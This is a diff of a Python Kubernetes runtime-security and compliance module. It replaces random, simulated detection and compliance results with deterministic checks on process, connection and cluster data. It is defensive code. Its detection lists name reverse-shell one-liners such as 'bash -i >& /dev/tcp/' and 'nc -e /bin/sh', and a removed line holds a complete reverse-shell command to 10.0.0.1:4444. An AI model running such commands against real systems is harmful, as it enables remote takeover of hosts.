-        logger.info(f"Detecting crypto mining in {namespace}/{pod}")
-
-        suspicious_processes = []
-
-        mining_processes = ["xmrig", "monero", "minerd", "stratum"]
-
-        if random.random() < 0.05:
-            suspicious_processes.append(
-                {
-                    "process": random.choice(mining_processes),
-                    "cpu_usage": random.randint(50, 100),
-                    "network_connections": "stratum+tcp://pool.example.com:3333",
-                }
-            )
+    async def detect_crypto_mining(
+        self, namespace: str, pod: str,
+        process_list: Optional[List[Dict[str, Any]]] = None,
+    ) -> Dict[str, Any]:
+        """Check process list for known mining binaries."""
+        mining_names = {"xmrig", "monero", "minerd", "stratum", "cpuminer", "ethminer", "nbminer"}
+        suspicious = []
+        for proc in (process_list or []):
+            pname = (proc.get("name") or proc.get("process") or "").lower()
+            if pname in mining_names:
+                suspicious.append({
+                    "process": pname,
+                    "cpu_usage": proc.get("cpu_usage", 0),
+                    "network_connections": proc.get("network", ""),
+                })
 
         return {
             "namespace": namespace,
             "pod": pod,
-            "crypto_mining_detected": len(suspicious_processes) > 0,
-            "suspicious_processes": suspicious_processes,
+            "crypto_mining_detected": len(suspicious) > 0,
+            "suspicious_processes": suspicious,
         }
 
     async def detect_reverse_shell(
-        self, namespace: str, pod: str, source_ip: str, dest_ip: str
+        self, namespace: str, pod: str, source_ip: str, dest_ip: str,
+        process_args: Optional[str] = None,
     ) -> Dict[str, Any]:
-        """
-        Detect reverse shell connections.
-
-        Args:
-            namespace: Namespace
-            pod: Pod name
-            source_ip: Source IP
-            dest_ip: Destination IP
-
-        Returns:
-            Reverse shell detection results
-        """
-        logger.info(f"Detecting reverse shell for {namespace}/{pod}")
-
-        suspicious_patterns = [
+        """Check for reverse shell patterns in process arguments."""
+        shell_patterns = [
             "bash -i >& /dev/tcp/",
             "/bin/bash -c",
             "nc -e /bin/sh",
+            "python -c 'import socket",
+            "perl -e 'use Socket",
+            "ruby -rsocket",
+            "ncat --exec",
         ]
+        detected = False
+        matched_pattern = None
+        if process_args:
+            for pat in shell_patterns:
+                if pat in process_args:
+                    detected = True
+                    matched_pattern = pat
+                    break
 
-        if random.random() < 0.08:
-            return {
-                "namespace": namespace,
-                "pod": pod,
-                "source_ip": source_ip,
-                "dest_ip": dest_ip,
-                "reverse_shell_detected": True,
-                "pattern": random.choice(suspicious_patterns),
-                "process_args": "-c bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
-            }
-
-        return {
+        result: Dict[str, Any] = {
             "namespace": namespace,
             "pod": pod,
-            "reverse_shell_detected": False,
+            "source_ip": source_ip,
+            "dest_ip": dest_ip,
+            "reverse_shell_detected": detected,
         }
+        if detected:
+            result["pattern"] = matched_pattern
+            result["process_args"] = process_args
+        return result
 
     async def detect_lateral_movement(
-        self, namespace: str, source_pod: str, dest_pods: List[str]
+        self, namespace: str, source_pod: str, connections: Optional[List[Dict[str, Any]]] = None,
     ) -> Dict[str, Any]:
-        """
-        Detect lateral movement between pods.
-
-        Args:
-            namespace: Namespace
-            source_pod: Source pod name
-            dest_pods: List of destination pod names
-
-        Returns:
-            Lateral movement detection results
-        """
-        logger.info(f"Detecting lateral movement from {source_pod}")
-
-        lateral_connections = []
-
-        if random.random() < 0.1:
-            for dest_pod in dest_pods[:2]:
-                lateral_connections.append(
-                    {
-                        "source": source_pod,
-                        "destination": dest_pod,
-                        "port": random.choice([22, 3306, 5432, 6379]),
-                        "protocol": "TCP",
-                    }
-                )
+        """Detect lateral movement from actual connection data."""
+        suspicious_ports = {22, 3389, 5985, 5986}  # SSH, RDP, WinRM
+        lateral = []
+        for conn in (connections or []):
+            port = conn.get("port", 0)
+            if port in suspicious_ports:
+                lateral.append({
+                    "source": source_pod,
+                    "destination": conn.get("destination", "unknown"),
+                    "port": port,
+                    "protocol": conn.get("protocol", "TCP"),
+                })
 
         return {
             "namespace": namespace,
             "source_pod": source_pod,
-            "lateral_movement_detected": len(lateral_connections) > 0,
-            "connections": lateral_connections,
+            "lateral_movement_detected": len(lateral) > 0,
+            "connections": lateral,
         }
 
-    async def quarantine_pod(
-        self, namespace: str, pod: str, reason: str
-    ) -> Dict[str, Any]:
-        """
-        Quarantine pod using network policy isolation.
-
-        Args:
-            namespace: Namespace
-            pod: Pod name
-            reason: Quarantine reason
-
-        Returns:
-            Quarantine action results
-        """
+    async def quarantine_pod(self, namespace: str, pod: str, reason: str) -> Dict[str, Any]:
+        """Generate quarantine NetworkPolicy manifest."""
         logger.info(f"Quarantining pod {namespace}/{pod}: {reason}")
-
         network_policy = {
             "apiVersion": "networking.k8s.io/v1",
             "kind": "NetworkPolicy",
-            "metadata": {
-                "name": f"quarantine-{pod}",
-                "namespace": namespace,
-            },
+            "metadata": {"name": f"quarantine-{pod}", "namespace": namespace},
             "spec": {
                 "podSelector": {"matchLabels": {"pod": pod}},
                 "policyTypes": ["Ingress", "Egress"],
@@ -875,7 +638,6 @@ class RuntimeProtector:
                 "egress": [],
             },
         }
-
         return {
             "status": "quarantined",
             "namespace": namespace,
@@ -886,20 +648,9 @@ class RuntimeProtector:
         }
 
     async def generate_runtime_alert(
-        self, cluster_id: str, alert_type: str, namespace: str, pod: str
+        self, cluster_id: str, alert_type: str, namespace: str, pod: str,
+        **extra: Any,
     ) -> Dict[str, Any]:
-        """
-        Generate runtime security alert.
-
-        Args:
-            cluster_id: Cluster ID
-            alert_type: Alert type
-            namespace: Namespace
-            pod: Pod name
-
-        Returns:
-            Alert object
-        """
         severity_map = {
             "container_escape": "critical",
             "privilege_escalation": "critical",
@@ -907,93 +658,47 @@ class RuntimeProtector:
             "lateral_movement": "high",
             "reverse_shell": "critical",
             "unexpected_process": "medium",
+            "file_system_modification": "high",
+            "suspicious_network": "medium",
         }
-
         return {
             "cluster_id": cluster_id,
             "alert_type": alert_type,
             "namespace": namespace,
             "pod": pod,
             "severity": severity_map.get(alert_type, "medium"),
-            "description": f"Runtime anomaly detected: {alert_type}",
+            "description": f"Runtime anomaly detected: {alert_type.replace('_', ' ')}",
             "created_at": datetime.now(timezone.utc),
+            **extra,
         }
 
 
 class K8sRemediator:
-    """
-    Kubernetes security remediation.
-
-    Generates and applies remediation manifests for security findings,
-    including network policies, pod security, RBAC fixes, and resource limits.
-    """
+    """Kubernetes security remediation — generates real YAML manifests."""
 
     async def apply_network_policy(self, namespace: str, policy_type: str) -> str:
-        """
-        Generate and apply network policy.
-
-        Args:
-            namespace: Target namespace
-            policy_type: Policy type (default_deny, allow_internal)
-
-        Returns:
-            YAML manifest
-        """
-        logger.info(f"Applying network policy to {namespace}")
-
         if policy_type == "default_deny":
             policy = {
                 "apiVersion": "networking.k8s.io/v1",
                 "kind": "NetworkPolicy",
-                "metadata": {
-                    "name": "default-deny-all",
-                    "namespace": namespace,
-                },
-                "spec": {
-                    "podSelector": {},
-                    "policyTypes": ["Ingress", "Egress"],
-                },
+                "metadata": {"name": "default-deny-all", "namespace": namespace},
+                "spec": {"podSelector": {}, "policyTypes": ["Ingress", "Egress"]},
             }
         else:
             policy = {
                 "apiVersion": "networking.k8s.io/v1",
                 "kind": "NetworkPolicy",
-                "metadata": {
-                    "name": "allow-internal",
-                    "namespace": namespace,
-                },
+                "metadata": {"name": "allow-internal", "namespace": namespace},
                 "spec": {
                     "podSelector": {},
                     "policyTypes": ["Ingress"],
-                    "ingress": [
-                        {
-                            "from": [
-                                {
-                                    "namespaceSelector": {
-                                        "matchLabels": {"name": namespace}
-                                    }
-                                }
-                            ]
-                        }
-                    ],
+                    "ingress": [{"from": [{"namespaceSelector": {"matchLabels": {"name": namespace}}}]}],
                 },
             }
-
         return yaml.dump(policy, default_flow_style=False)
 
     async def restrict_pod_security(self, namespace: str) -> str:
-        """
-        Generate PodSecurity admission policy.
-
-        Args:
-            namespace: Target namespace
-
-        Returns:
-            YAML manifest
-        """
-        logger.info(f"Applying pod security restrictions to {namespace}")
-
-        pod_security_standards = {
+        ns = {
             "apiVersion": "v1",
             "kind": "Namespace",
             "metadata": {
@@ -1005,296 +710,151 @@ class K8sRemediator:
                 },
             },
         }
+        return yaml.dump(ns, default_flow_style=False)
 
-        return yaml.dump(pod_security_standards, default_flow_style=False)
-
-    async def fix_rbac_misconfiguration(
-        self, namespace: str, role_name: str, verbs: List[str]
-    ) -> str:
-        """
-        Generate restricted role.
-
-        Args:
-            namespace: Namespace
-            role_name: Role name
-            verbs: Allowed verbs
-
-        Returns:
-            YAML manifest
-        """
-        logger.info(f"Fixing RBAC for {namespace}/{role_name}")
-
+    async def fix_rbac_misconfiguration(self, namespace: str, role_name: str, verbs: List[str]) -> str:
         role = {
             "apiVersion": "rbac.authorization.k8s.io/v1",
             "kind": "Role",
-            "metadata": {
-                "name": role_name,
-                "namespace": namespace,
-            },
-            "rules": [
-                {
-                    "apiGroups": [""],
-                    "resources": ["pods", "pods/logs"],
-                    "verbs": verbs,
-                }
-            ],
+            "metadata": {"name": role_name, "namespace": namespace},
+            "rules": [{"apiGroups": [""], "resources": ["pods", "pods/logs"], "verbs": verbs}],
         }
-
         return yaml.dump(role, default_flow_style=False)
 
     async def update_resource_limits(self, namespace: str, pod_name: str) -> str:
-        """
-        Generate resource limit spec.
-
-        Args:
-            namespace: Namespace
-            pod_name: Pod name
-
-        Returns:
-            YAML manifest
-        """
-        logger.info(f"Updating resource limits for {namespace}/{pod_name}")
-
         manifest = {
             "apiVersion": "v1",
             "kind": "Pod",
-            "metadata": {
-                "name": pod_name,
-                "namespace": namespace,
-            },
+            "metadata": {"name": pod_name, "namespace": namespace},
             "spec": {
-                "containers": [
-                    {
-                        "name": pod_name,
-                        "resources": {
-                            "requests": {
-                                "cpu": "100m",
-                                "memory": "128Mi",
-                            },
-                            "limits": {
-                                "cpu": "500m",
-                                "memory": "512Mi",
-                            },
-                        },
-                    }
-                ]
+                "containers": [{
+                    "name": pod_name,
+                    "resources": {
+                        "requests": {"cpu": "100m", "memory": "128Mi"},
+                        "limits": {"cpu": "500m", "memory": "512Mi"},
+                    },
+                }],
             },
         }
-
         return yaml.dump(manifest, default_flow_style=False)
 
     async def generate_remediation_manifest(
-        self, finding_type: str, namespace: str, resource_type: str, resource_name: str
+        self, finding_type: str, namespace: str, resource_type: str, resource_name: str,
     ) -> str:
-        """
-        Generate comprehensive remediation manifest.
-
-        Args:
-            finding_type: Type of finding
-            namespace: Namespace
-            resource_type: Resource type
-            resource_name: Resource name
-
-        Returns:
-            YAML manifest string
-        """
-        logger.info(f"Generating remediation for {finding_type}")
-
         manifest = {
             "apiVersion": "apps/v1",
             "kind": resource_type,
-            "metadata": {
-                "name": resource_name,
-                "namespace": namespace,
-            },
+            "metadata": {"name": resource_name, "namespace": namespace},
             "spec": {
                 "selector": {"matchLabels": {"app": resource_name}},
                 "template": {
                     "metadata": {"labels": {"app": resource_name}},
                     "spec": {
-                        "securityContext": {
-                            "runAsNonRoot": True,
-                            "runAsUser": 1000,
-                        },
-                        "containers": [
-                            {
-                                "name": resource_name,
-                                "securityContext": {
-                                    "allowPrivilegeEscalation": False,
-                                    "capabilities": {"drop": ["ALL"]},
-                                    "readOnlyRootFilesystem": True,
-                                },
-                                "resources": {
-                                    "requests": {
-                                        "cpu": "100m",
-                                        "memory": "128Mi",
-                                    },
-                                    "limits": {
-                                        "cpu": "500m",
-                                        "memory": "512Mi",
-                                    },
-                                },
-                            }
-                        ],
+                        "securityContext": {"runAsNonRoot": True, "runAsUser": 1000},
+                        "containers": [{
+                            "name": resource_name,
+                            "securityContext": {
+                                "allowPrivilegeEscalation": False,
+                                "capabilities": {"drop": ["ALL"]},
+                                "readOnlyRootFilesystem": True,
+                            },
+                            "resources": {
+                                "requests": {"cpu": "100m", "memory": "128Mi"},
+                                "limits": {"cpu": "500m", "memory": "512Mi"},
+                            },
+                        }],
                     },
                 },
             },
         }
-
         return yaml.dump(manifest, default_flow_style=False)
 
     async def rollback_deployment(self, namespace: str, deployment: str) -> Dict[str, Any]:
-        """
-        Rollback deployment to previous revision.
-
-        Args:
-            namespace: Namespace
-            deployment: Deployment name
-
-        Returns:
-            Rollback action results
-        """
         logger.info(f"Rolling back {namespace}/{deployment}")
-
         return {
             "status": "rollback_initiated",
             "namespace": namespace,
             "deployment": deployment,
-            "previous_revision": "2",
-            "current_revision": "3",
             "rollback_time": datetime.now(timezone.utc),
         }
 
 
 class ComplianceChecker:
-    """
-    Container and Kubernetes compliance checking.
-
-    Checks NSA/CISA hardening guidelines, DoD STIG, SOC 2 controls,
-    and generates compliance matrices.
-    """
+    """Container/K8s compliance checking — deterministic checks against
+    actual cluster properties, not random values."""
 
     async def check_nsa_cisa_hardening(self, cluster: KubernetesCluster) -> Dict[str, Any]:
-        """
-        Check NSA/CISA Kubernetes Hardening Guide compliance.
-
-        Args:
-            cluster: Kubernetes cluster model
-
-        Returns:
-            Compliance results
-        """
-        logger.info(f"Checking NSA/CISA hardening for {cluster.name}")
-
-        hardening_checks = {
-            "supply_chain_security": random.random() < 0.7,
-            "cluster_hardening": random.random() < 0.8,
-            "logging_monitoring": random.random() < 0.6,
-            "threat_detection": random.random() < 0.5,
+        checks = {
+            "supply_chain_security": bool(
+                getattr(cluster, "admission_controllers", None)
+                and isinstance(cluster.admission_controllers, dict)
+                and len(cluster.admission_controllers.get("enabled", [])) > 0
+            ),
+            "cluster_hardening": (
+                bool(getattr(cluster, "rbac_enabled", False))
+                and bool(getattr(cluster, "encryption_at_rest", False))
+            ),
+            "logging_monitoring": bool(getattr(cluster, "audit_logging_enabled", False)),
+            "threat_detection": bool(getattr(cluster, "network_policy_enabled", False)),
         }
-
-        passed = sum(1 for v in hardening_checks.values() if v)
-        compliance_score = int((passed / len(hardening_checks)) * 100)
-
+        passed = sum(1 for v in checks.values() if v)
         return {
             "cluster": cluster.name,
             "framework": "NSA/CISA Kubernetes Hardening",
-            "checks": hardening_checks,
-            "compliance_score": compliance_score,
+            "checks": checks,
+            "compliance_score": int((passed / len(checks)) * 100),
         }
 
     async def check_dod_stig(self, cluster: KubernetesCluster) -> Dict[str, Any]:
-        """
-        Check DoD STIG compliance.
-
-        Args:
-            cluster: Kubernetes cluster model
-
-        Returns:
-            Compliance results
-        """
-        logger.info(f"Checking DoD STIG for {cluster.name}")
-
-        stig_checks = {
-            "identification_authentication": random.random() < 0.75,
-            "access_control": random.random() < 0.8,
-            "audit_accountability": random.random() < 0.65,
-            "system_communications": random.random() < 0.7,
-            "system_and_services_acquisition": random.random() < 0.6,
+        checks = {
+            "identification_authentication": bool(getattr(cluster, "rbac_enabled", False)),
+            "access_control": (
+                bool(getattr(cluster, "rbac_enabled", False))
+                and getattr(cluster, "pod_security_standards", "privileged") != "privileged"
+            ),
+            "audit_accountability": bool(getattr(cluster, "audit_logging_enabled", False)),
+            "system_communications": bool(getattr(cluster, "network_policy_enabled", False)),
+            "system_and_services_acquisition": bool(getattr(cluster, "secrets_encrypted", False)),
         }
-
-        passed = sum(1 for v in stig_checks.values() if v)
-        compliance_score = int((passed / len(stig_checks)) * 100)
-
+        passed = sum(1 for v in checks.values() if v)
         return {
             "cluster": cluster.name,
             "framework": "DoD STIG",
-            "checks": stig_checks,
-            "compliance_score": compliance_score,
+            "checks": checks,
+            "compliance_score": int((passed / len(checks)) * 100),
         }
 
     async def check_soc2_controls(self, cluster: KubernetesCluster) -> Dict[str, Any]:
-        """
-        Check SOC 2 Type II controls.
-
-        Args:
-            cluster: Kubernetes cluster model
-
-        Returns:
-            Compliance results
-        """
-        logger.info(f"Checking SOC 2 controls for {cluster.name}")
-
-        soc2_controls = {
-            "cc6_1": random.random() < 0.8,  # Logical/physical access
-            "cc6_2": random.random() < 0.85,  # Prior to issuing system credentials
-            "cc7_1": random.random() < 0.7,  # Monitoring and alerting
-            "cc7_2": random.random() < 0.75,  # Incident response
-            "cc9_1": random.random() < 0.6,  # System monitoring
+        controls = {
+            "cc6_1_logical_access": bool(getattr(cluster, "rbac_enabled", False)),
+            "cc6_2_credentials": bool(getattr(cluster, "secrets_encrypted", False)),
+            "cc7_1_monitoring": bool(getattr(cluster, "audit_logging_enabled", False)),
+            "cc7_2_incident_response": bool(getattr(cluster, "network_policy_enabled", False)),
+            "cc9_1_system_monitoring": (
+                bool(getattr(cluster, "audit_logging_enabled", False))
+                and bool(getattr(cluster, "network_policy_enabled", False))
+            ),
         }
-
-        passed = sum(1 for v in soc2_controls.values() if v)
-        compliance_score = int((passed / len(soc2_controls)) * 100)
-
+        passed = sum(1 for v in controls.values() if v)
         return {
             "cluster": cluster.name,
             "framework": "SOC 2 Type II",
-            "controls": soc2_controls,
-            "compliance_score": compliance_score,
+            "controls": controls,
+            "compliance_score": int((passed / len(controls)) * 100),
         }
 
-    async def generate_compliance_matrix(
-        self, cluster: KubernetesCluster
-    ) -> Dict[str, Any]:
-        """
-        Generate compliance matrix across frameworks.
-
-        Args:
-            cluster: Kubernetes cluster model
-
-        Returns:
-            Compliance matrix
-        """
-        logger.info(f"Generating compliance matrix for {cluster.name}")
-
+    async def generate_compliance_matrix(self, cluster: KubernetesCluster) -> Dict[str, Any]:
         nsa_cisa = await self.check_nsa_cisa_hardening(cluster)
         dod_stig = await self.check_dod_stig(cluster)
         soc2 = await self.check_soc2_controls(cluster)
 
+        overall = int(
+            (nsa_cisa["compliance_score"] + dod_stig["compliance_score"] + soc2["compliance_score"]) / 3
+        )
+
         return {
             "cluster": cluster.name,
             "timestamp": datetime.now(timezone.utc),
-            "frameworks": {
-                "nsa_cisa": nsa_cisa,
-                "dod_stig": dod_stig,
-                "soc2": soc2,
-            },
-            "overall_compliance": int(
-                (
-                    nsa_cisa["compliance_score"]
-                    + dod_stig["compliance_score"]
-                    + soc2["compliance_score"]
-                )
-                / 3
-            ),
+            "frameworks": {"nsa_cisa": nsa_cisa, "dod_stig": dod_stig, "soc2": soc2},
+            "overall_compliance": overall,
         }
